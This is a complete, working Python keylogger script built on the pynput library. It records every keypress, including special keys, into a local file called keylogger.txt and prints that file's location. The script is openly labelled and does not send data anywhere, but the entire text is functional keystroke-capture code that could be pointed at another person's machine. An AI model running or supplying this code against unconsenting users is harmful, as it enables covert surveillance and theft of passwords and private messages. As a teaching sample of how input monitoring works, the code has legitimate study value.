import os
from pynput.keyboard import Key, Listener

# Define the file path where keystrokes will save
log_file = "keylogger.txt"

def write_to_file(key):
    # Clean up the key string format
    key_data = str(key).replace("'", "")
    
    # Handle common formatting keys
    if key_data == "Key.space":
        key_data = " "
    elif key_data == "Key.enter":
        key_data = "\n"
    elif "Key." in key_data:
        key_data = f" [{key_data}] "

    # Append the keypress to the local text file
    with open(log_file, "a") as f:
        f.write(key_data)

print(f"Script is running! Your file is being saved here:\n{os.path.abspath(log_file)}\nGo to this location and type some keys...")

# Set up the listener loop to catch keyboard events
with Listener(on_press=write_to_file) as listener:
    listener.join()
